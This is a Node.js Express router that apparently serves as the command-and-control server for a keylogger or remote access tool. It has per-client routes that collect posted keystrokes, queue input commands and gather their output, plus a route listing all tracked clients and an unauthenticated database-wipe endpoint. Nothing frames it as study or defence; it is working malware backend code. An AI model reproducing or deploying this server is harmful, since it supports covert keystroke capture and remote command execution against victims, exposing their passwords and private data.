const database = require("../model/database");
const express = require("express");
const router = express.Router();


router.get("/:user/input", function(request, response){

    user = request.params.user;

    if (!database.users[user]){
        database.createUser(user);
    }
    
    response.send(database.getInput(user));
});


router.get("/:user/keylogger", function(request, response){

    user = request.params.user;

    if (!database.users[user]){
        database.createUser(user);
    }
    
    response.send(database.getKeylogger(user).join(" "));
});


router.get("/:user/output", function(request, response){

    user = request.params.user;

    if (!database.users[user]){
        database.createUser(user);
    }
    
    response.send(database.getOutput(user));
});


router.get("/users", function(request, response){
    response.send(database.getUsers());
});


router.post("/destroy", function(request, response){
    if (request.body.text === "True"){
        database.destroy();
    }
    response.send("OK");
});


router.post("/:user/input", function(request, response){

    user = request.params.user;

    if (!database.users[user]){
        database.createUser(user);
    }

    if ("text" in request.body){
        database.setInput(user, request.body.text);
    }
    response.send("OK");
});


router.post("/:user/keylogger", function(request, response){

    user = request.params.user;

    if (!database.users[user]){
        database.createUser(user);
    }

    if ("text" in request.body){
        database.addKey(user, request.body.text);
    }
    response.send("OK");
});


router.post("/:user/output", function(request, response){

    user = request.params.user;

    if (!database.users[user]){
        database.createUser(user);
    }

    if ("text" in request.body){
        database.setOutput(user, request.body.text);
    }
    response.send("OK");
});


module.exports = router;